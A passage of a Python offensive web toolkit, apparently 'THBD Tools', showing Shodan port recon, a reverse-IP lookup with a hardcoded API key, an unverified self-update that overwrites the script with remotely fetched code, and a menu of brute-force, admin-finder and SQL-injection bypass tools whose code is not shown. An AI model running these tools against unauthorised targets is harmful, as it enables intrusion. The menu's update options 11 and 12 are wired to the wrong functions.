            ip = socket.gethostbyname(target)
            host = api.host(ip)
            ports = host.get('ports', [])
            if ports:
                report.append(f"Open ports on {ip}:")
                for p in ports:
                    report.append(f" - Port {p}")
            else:
                report.append(f"No open ports found on {ip}")
        except Exception as e:
            report.append(f"Shodan scan failed: {e}")
    else:
        report.append("Shodan scan skipped (no API key).")

    # Save report
    report.append("\n" + "=" * 50)
    report.append("Recon complete. Report generated by THBD Tools.\n")

    with open("recon_report.txt", "w", encoding="utf-8") as file:
        file.write("\n".join(report))

    print("\n[+] Recon complete! Report saved as recon_report.txt\n")


#REV IP LOOKUP 

def rev_ip():
    print("\n[*] THBD Reverse IP Lookup\n")

    website = input("Enter target domain (without http/https): ").strip()
    website = website.replace('http://', '').replace('https://', '').replace('/', '')

    try:
        ip = socket.gethostbyname(website)
        print(f"[+] Resolved IP: {ip}")
    except socket.gaierror:
        print("[-] Error: Could not resolve domain.")
        return

    url = f"https://rev-ip.onrender.com/?key=Flashx&ip={ip}"

    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            domains = data.get("domains", [])

            if not domains:
                print("[-] No domains found.")
                return

            print("\n[+] Found Domains:\n")
            for d in domains:
                print(d)

            file_name = input("\nEnter report file name (without .txt) or press Enter to skip saving: ").strip()

            if file_name:
                if not file_name.endswith(".txt"):
                    file_name += ".txt"

                with open(file_name, "w") as f:
                    for d in domains:
                        f.write(d + "\n")
                print(f"\n[+] Results saved to {file_name}")
            else:
                print("\n[+] Display only mode. No file saved.")

        else:
            print(f"[-] Server returned status code {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")


#==========================
# === UPDATE FUNCTIONS ===
# =====================


def update_tool():
    print(Fore.MAGENTA + "\n[⬆️] Updating tool...\n" + Style.RESET_ALL)
    try:
        response = requests.get(TOOL_UPDATE_URL, timeout=20)
        response.raise_for_status()
        with open(__file__, "wb") as f:
            f.write(response.content)
        print(Fore.GREEN +
              "[✓] Tool updated successfully. Please restart the program." +
              Style.RESET_ALL)
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"[✗] Tool update failed: {e}" + Style.RESET_ALL)


def update_wordlist():
    print(Fore.MAGENTA + "\n[⬆️] Updating default wordlists...\n" +
          Style.RESET_ALL)
    try:
        download_file(WORDLIST_DOWNLOAD_URL, DEFAULT_WORDLIST_PATH)
        download_file(DIR_BRUTE_URL, DIR_BRUTE_PATH)
        download_file(DEFAULT_USR_URL, DEFAULT_USR_PATH)
        download_file(DEFAULT_PASS_URL, DEFAULT_PASS_PATH)
        print(Fore.GREEN + "[✓] Wordlists updated successfully." +
              Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[✗] Wordlist update failed: {e}" + Style.RESET_ALL)


# =====================
# === MAIN MENU ===
# =====================


def main_menu():
    while True:
        print_banner()
        print("Select a Tool:")
        print("1. Admin Finder")
        print("2. Dir Brute Force")
        print("3. Combo Attack (Admin + Dir Brute)")
        print("4. CMS Detector")
        print("5. Wayback URL Extractor")
        print("6. WAF Detector")
        print("7. Login Page Brute Force")
        print("8. SQLi Bypass Wordlist Test")
        print("9.ALL IN ONE RECON")
        print("10. Rev IP lookup")
        print("11. Update Tool (program)")
        print("12. Update Default Wordlists")       
        print("0. Exit")

        choice = input("\nYour choice: ").strip()

        if choice == "1":
            admin_finder_menu()
        elif choice == "2":
            dir_brute_menu()
        elif choice == "3":
            combo_attack()
        elif choice == "4":
            target = input("Enter target URL (e.g. example.com): ").strip()
            cms_detector(target)
        elif choice == "5":
            domain = input(
                "Enter domain for Wayback URL extraction (e.g. example.com): "
            ).strip()
            wayback_url_extractor(domain)
        elif choice == "6":
            target = input("Enter target URL (e.g. example.com): ").strip()
            waf_detector(target)
        elif choice == "7":
            login_bruteforce()
        elif choice == "8":
            sqli_beast_tool() 
        elif choice == "9":
            full_recon_combo_txt()
        elif choice == "10":
            rev_ip()
        elif choice == "11":
            update_wordlist()
        elif choice == "12":
            update_tool()

        elif choice == "0":
            print(Fore.CYAN + "👋 Bye! Stay sharp, THBD Community 💻⚔️" +
                  Style.RESET_ALL)
            break
        else:
            print(Fore.RED + "❌ Invalid option." + Style.RESET_ALL)


# =====================
# === ENTRY POINT ===
# =====================

if __name__ == "__main__":
    auto_check_update()
    show_signature()
    main_menu()
